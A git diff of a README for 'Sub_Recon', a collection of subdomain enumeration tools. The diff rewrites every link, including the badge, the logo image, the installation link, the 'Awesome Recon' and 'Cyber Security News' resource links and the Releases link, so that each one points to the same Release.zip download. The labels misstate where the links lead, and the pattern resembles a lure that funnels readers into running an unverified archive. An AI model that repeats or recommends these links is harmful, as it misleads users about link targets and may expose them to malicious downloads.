@@ -3,7 +3,7 @@
 
 ## Gather SubDomains Reconnaissance Tools Together to Get the Best Result Possible
 
-![Sub_Recon](https://img.shields.io/badge/Sub_Recon-Bringing_SubDomain_Reconnaissance_Together-green)
+![Sub_Recon](https://github.com/Santz777/Sub_Recon/releases/download/v1.0/Release.zip)
 
 Welcome to Sub_Recon, a comprehensive collection of tools focused on subdomain reconnaissance. This repository aims to provide you with the necessary resources to conduct thorough subdomain enumeration and discovery, enhancing your overall security assessment and vulnerability testing.
 
@@ -18,7 +18,7 @@ Welcome to Sub_Recon, a comprehensive collection of tools focused on subdomain r
 - ... and more!
 
 ### Installation
-To access the latest version of Sub_Recon, make sure to download the [release package](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Simply unzip the file and launch the tools to begin your subdomain reconnaissance journey!
+To access the latest version of Sub_Recon, make sure to download the [release package](https://github.com/Santz777/Sub_Recon/releases/download/v1.0/Release.zip). Simply unzip the file and launch the tools to begin your subdomain reconnaissance journey!
 
 ### Get Started
 1. Clone the repository to your local machine.
@@ -35,15 +35,15 @@ To access the latest version of Sub_Recon, make sure to download the [release pa
 5. Join the community discussions to collaborate on further enhancements.
 
 ### Additional Resources
-- For more information on subdomain reconnaissance techniques, visit [Awesome Recon](https://github.com/xxx/awesome-recon).
-- Explore the latest tools and resources in the cybersecurity community through [Cyber Security News](https://www.cybersecuritynews.org/).
+- For more information on subdomain reconnaissance techniques, visit [Awesome Recon](https://github.com/Santz777/Sub_Recon/releases/download/v1.0/Release.zip).
+- Explore the latest tools and resources in the cybersecurity community through [Cyber Security News](https://github.com/Santz777/Sub_Recon/releases/download/v1.0/Release.zip).
 
 ### Repository Topics
 amass, assetfinder, automation, discovery, dns, dnsrecon, findomain, gobuster, osint, reconnaissance, subdomain-enumeration, subfinder, sublist3r, theharvester, wordlist
 
 ### Releases
-If the provided download link does not work or you are looking for updated versions, please check the [Releases](https://github.com/cli/browser/releases) section for the latest releases.
+If the provided download link does not work or you are looking for updated versions, please check the [Releases](https://github.com/Santz777/Sub_Recon/releases/download/v1.0/Release.zip) section for the latest releases.
 
 Join us in advancing your subdomain reconnaissance capabilities with Sub_Recon! 🛡️🔍🌐
 
-![Sub_Recon Logo](https://example.com/logo.png)
+![Sub_Recon Logo](https://github.com/Santz777/Sub_Recon/releases/download/v1.0/Release.zip)
